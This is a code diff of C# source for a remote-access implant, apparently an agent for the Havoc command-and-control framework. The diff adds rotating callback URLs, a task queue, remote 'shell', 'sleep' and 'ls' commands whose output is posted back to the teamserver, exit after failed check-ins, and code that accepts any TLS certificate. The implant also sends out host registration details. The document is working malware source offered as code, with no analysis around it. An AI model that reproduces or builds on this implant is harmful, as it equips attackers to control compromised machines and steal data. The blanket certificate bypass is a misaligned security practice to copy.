@@ -20,14 +20,28 @@ namespace HavocImplant
     public class Implant
     {
         // Altered by build
-        string url = Config.url;
-        int sleepTime = Config.sleepTime;
+        string[] url = Config.url;
+        public int sleepTime = Config.sleepTime;
+        int timeout = Config.timeout;
+        public int maxTries = Config.maxTries;
+        public bool secure = Config.secure;
 
         // Communication with Teamserver
-        byte[] id;
+        byte[] agentId;
         byte[] magic;
         bool registered;
-        public string outputData = "";
+        int timeoutCounter = 0;
+        public Dictionary<int, task> taskingInformation = new Dictionary<int, task>();
+        public struct task
+        {
+            public string taskCommand;
+            public string taskOutput;
+            public task(string taskCommand, string taskOutput)
+            {
+                this.taskCommand = taskCommand;
+                this.taskOutput = taskOutput;
+            }
+        }
 
         // Registration Properties
         string hostname = Dns.GetHostName();
@@ -41,37 +55,92 @@ namespace HavocImplant
         string processName = Process.GetCurrentProcess().ProcessName;
         string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
 
-        static void Main(string[] args)
+        static void Main(string[] args) // Looping through tasks and stuff
         {
             Implant implant = new Implant();
+            Random rand = new Random();
+            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
             while (!implant.registered) implant.Register();
+
+            Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
+            Console.WriteLine($"Implant will consider {implant.timeout / 1000} as the timeout");
+
             while (true)
             {
-                string commands = implant.CheckIn(implant.outputData);
-                implant.outputData = "";
-                if (commands.Length > 4)
+                Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");
+
+                string cumalativeOutput = "";
+
+                for (int i = 0; i < implant.taskingInformation.Count; i++)
                 {
-                    string[] commandsArray = commands.Split(new string[] { commands.Substring(0, 4) }, StringSplitOptions.RemoveEmptyEntries);
-                    Console.WriteLine("Command Queue length: {0}", commandsArray.Length);
-                    foreach (string command in commandsArray)
+                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
+                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                     {
+                        Console.WriteLine($"Shipping off Task ID {taskId}");
+                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
+                    }
+                    implant.taskingInformation.Remove(taskId);
+                    i--;
+                }
+                string rawTasks = implant.CheckIn(cumalativeOutput);
+
+                // Chunk of 4 = size = there is a task that is being sent to implant
+                if (rawTasks.Length > 4)
+                {
+                    int offset = 0;
+                    string task = "";
+
+                    // Parsing the raw request from teamserver, splitting task into dictionary entries
+                    while (offset < rawTasks.Length)
+                    {
+                        
+                        int size = BitConverter.ToInt32(Encoding.UTF8.GetBytes(rawTasks.Substring(offset, 4)), 0); // [4 bytes containing size of task][task]
+                        Console.WriteLine($"Task is of size {size}");
+                        if (offset == 0) { task = rawTasks.Substring(offset + 4, size).Trim(); }
+                        else { task = rawTasks.Substring(offset + 4, size).Trim(); }
+
+                        List<byte> cleaning = Encoding.UTF8.GetBytes(task).ToList<byte>();
+                        cleaning.Remove(0x00);
+                        task = Encoding.UTF8.GetString(cleaning.ToArray()).Trim(); // Clear up the funky
+
+                        Console.WriteLine("Task is {0}", task);
+                        offset += size + 4;
+
+                        int taskId = rand.Next(10000*10000);
+                        implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
+                        Console.WriteLine("Task has id {0}", taskId);
+
+                    }
+
+                    Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);
+
+                    // Parsing the commands from the dictionary
+                    for (int i = 0; i < implant.taskingInformation.Count; i++) 
+                    {
+                        string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;
                         Console.WriteLine("Read command: {0}", command);
 
-                        List<byte> commandBytes = Encoding.UTF8.GetBytes(command.Split(' ')[0]).ToList();
-                        commandBytes.Remove(0x00);
-                        Console.WriteLine("Length is: {0}", Encoding.UTF8.GetString(commandBytes.ToArray()).Length);
-                        string sanitizedCommand = Encoding.UTF8.GetString(commandBytes.ToArray());
-                        switch (sanitizedCommand.Split(' ')[0])
+                        int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
+                        Console.WriteLine("The ID is: {0}", taskId);
+
+                        switch (command.Split(' ')[0])
                         {
                             case "shell":
-                                Thread childThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5)));
-                                childThread.Start();
+                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
+                                shellThread.Start();
                                 break;
-                            //outputData += implant.runCommand(command.Substring(5)).Replace("\\", "\\\\"); break; // Parse the shell command after the "shell"
                             case "goodbye":
-                                Console.WriteLine("It is die time my dudes"); Environment.Exit(0); break;
+                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
+                            case "sleep":
+                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
+                                sleepThread.Start();
+                                break;
+                            case "ls":
+                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
+                                lsThread.Start();
+                                break;
                         }
-                        //Console.WriteLine("Output Data: {0}", outputData);
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
@@ -80,9 +149,9 @@ namespace HavocImplant
         public void Register()
         {
             magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
-            id = Encoding.ASCII.GetBytes(random_id().ToString());
+            agentId = Encoding.ASCII.GetBytes(random_id().ToString());
 
-            string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(id)));
+            string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(agentId)));
             byte[] agentHeader = createHeader(magic, registrationRequestBody);
 
             string response = "";
@@ -119,10 +188,10 @@ namespace HavocImplant
             }
             //else Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
             Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
-            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + id.Length];
+            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + agentId.Length];
             Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
             Array.Copy(magic, 0, agentHeader, size_bytes.Length, magic.Length);
-            Array.Copy(id, 0, agentHeader, size_bytes.Length + magic.Length, id.Length);
+            Array.Copy(agentId, 0, agentHeader, size_bytes.Length + magic.Length, agentId.Length);
             return agentHeader;
         }
         int random_id()
@@ -161,8 +230,18 @@ namespace HavocImplant
         }
         public string sendReq(string requestBody, byte[] agentHeader)
         {
+            bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
+            {
+                return true;
+            }
+            Random rand = new Random();
             string responseString = "";
-            var request = (HttpWebRequest)WebRequest.Create(url);
+            ServicePointManager
+    .ServerCertificateValidationCallback +=
+    (sender, cert, chain, sslPolicyErrors) => true;
+            //if (secure) System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(AcceptAllCertifications);
+
+            var request = (HttpWebRequest)WebRequest.Create(url[rand.Next(0, url.Length)]);
 
             ArrayList arrayList = new ArrayList();
             arrayList.AddRange(agentHeader);
@@ -175,6 +254,7 @@ namespace HavocImplant
             request.Method = "POST";
             request.ContentType = "application/x-www-form-urlencoded";
             request.ContentLength = data.Length;
+            request.Timeout = timeout;
             try
             {
                 using (var stream = request.GetRequestStream())
@@ -185,6 +265,13 @@ namespace HavocImplant
 
                 byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                 responseString = Encoding.UTF8.GetString(bytes);
+                if (responseString.Length > 0)
+                {
+                    //outputData = "";
+                    timeoutCounter = 0;
+                }
+                Console.WriteLine("Setting counter to 0");
+                timeoutCounter = 0;
             }
             catch (WebException ex)
             {
@@ -195,7 +282,15 @@ namespace HavocImplant
                     byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                     responseString = Encoding.UTF8.GetString(bytes);
                 }
+                if (ex.Status == WebExceptionStatus.Timeout || ex.Status == WebExceptionStatus.ConnectFailure)
+                {
+                    timeoutCounter += 1;
+                    if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
+                }
+                Console.WriteLine($"status code: {ex.Status}");
             }
+
+            //outputData = "";
             return responseString;
         }
         static string getIPv4()
